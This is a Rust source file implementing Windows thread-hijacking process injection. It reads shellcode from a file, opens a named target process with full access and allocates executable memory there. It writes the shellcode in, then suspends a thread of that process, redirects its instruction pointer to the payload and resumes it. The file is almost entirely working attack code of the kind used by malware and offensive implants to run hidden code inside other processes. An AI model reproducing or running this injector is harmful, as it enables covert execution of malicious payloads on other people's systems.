

use std::mem::transmute;
use std::ptr::{null, null_mut};
use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows_sys::Win32::Foundation::{GetLastError, FALSE, TRUE, CloseHandle};
use windows_sys::Win32::System::Diagnostics::Debug::{WriteProcessMemory, GetThreadContext,SetThreadContext, CONTEXT};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{THREADENTRY32, CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, Thread32First, Thread32Next};
use windows_sys::Win32::System::SystemServices::CONTEXT_AMD64;
use windows_sys::Win32::System::Threading::*;
use windows_sys::Win32::System::Memory::*;
pub type HANDLE = isize;

pub const CONTEXT_CONTROL: i32 = CONTEXT_AMD64 | 0x01; 
pub const CONTEXT_INTEGER: i32 = CONTEXT_AMD64 | 0x02;
pub const CONTEXT_SEGMENTS: i32 = CONTEXT_AMD64 | 0x04; 
pub const CONTEXT_FLOATING_POINT: i32 = CONTEXT_AMD64 | 0x08;
pub const CONTEXT_DEBUG_REGISTERS: i32 = CONTEXT_AMD64 | 0x10;
pub const CONTEXT_ALL: i32 = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS;

pub fn display_all(context: CONTEXT) {
    println!("rax={:#018x} rbx={:#018x} rcx={:#018x}", context.Rax, context.Rbx, context.Rcx);
    println!("rdx={:#018x} rsi={:#018x} rdi={:#018x}", context.Rdx, context.Rsi, context.Rdi);
    println!("rip={:#018x} rsp={:#018x} rbp={:#018x}", context.Rip, context.Rsp, context.Rbp);
    println!(" r8={:#018x}  r9={:#018x} r10={:#018x}", context.R8, context.R9, context.R10);
    println!("r11={:#018x} r12={:#018x} r13={:#018x}", context.R11, context.R12, context.R13);
    println!("r14={:#018x} r15={:#018x} eflags={:#010x}", context.R14, context.R15, context.EFlags);

}

pub fn thread_injector(process_name: &str, shellcode_path: &str){

    let shellcode = std::fs::read(shellcode_path).expect("[-] Read failed");
    let shellcode_size = shellcode.len();
    let mut system = System::new();


    system.refresh_processes();
    let pid = system
        .processes_by_name(process_name)
        .next()
        .expect("[-]no process!")
        .pid()
        .as_u32();
    
    unsafe {
        struct AlignedContext {
            context: CONTEXT,
        }
        const ENTRY_SIZE: u32 =  std::mem::size_of::<THREADENTRY32>() as u32;
        let mut thread_entry    = THREADENTRY32 { dwSize: ENTRY_SIZE, cntUsage: 0, th32ThreadID: 0, th32OwnerProcessID: 0, tpBasePri: 0, tpDeltaPri: 0, dwFlags: 0 };
        let mut contexte: CONTEXT = std::mem::zeroed();
        contexte.ContextFlags = CONTEXT_ALL as u32;
        let mut _has_err = false;
        println!("{}", CONTEXT_ALL);
        println!("{}", CONTEXT_ALL as u32);

        let process_handle = OpenProcess(
            PROCESS_ALL_ACCESS,
            FALSE , 
            pid);
        if process_handle == 0 {
            panic!("[-]OpenProcess failed: {}!", GetLastError());
        }

        let remote_buffer  = VirtualAllocEx(
            process_handle,
            null(), 
            shellcode_size, 
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE );
        if remote_buffer.is_null() {
            panic!("[-]VirtualAllocEx failed: {}!", GetLastError());
        }

        let res = WriteProcessMemory(
            process_handle,
            remote_buffer, 
            shellcode.as_ptr().cast(),
            shellcode_size,
            null_mut());
        if res == 0 {
            panic!("[-] Write Process Memory failed: {}!", GetLastError());
        }


   
        let h_snapshot: isize = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if h_snapshot == 0{
            panic!("[-] CreateToolhelp32Snapshot failed: {}", GetLastError());
        }
        let mut thread: HANDLE = 0;
        Thread32First(h_snapshot, &mut thread_entry);
        while Thread32Next(h_snapshot,  &mut thread_entry) == TRUE {
            if thread_entry.th32OwnerProcessID == pid{
                thread  = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, thread_entry.th32ThreadID);
                break;
            }
        }
        _has_err |= SuspendThread(thread) as i32 == -1i32;
        GetThreadContext(thread,&mut contexte);
        let func =transmute(remote_buffer);        
        contexte.Rip =  func;
        SetThreadContext(thread,&mut contexte);
        _has_err |= ResumeThread(thread) as i32 == -1i32;
        CloseHandle(thread);
    }
    

}
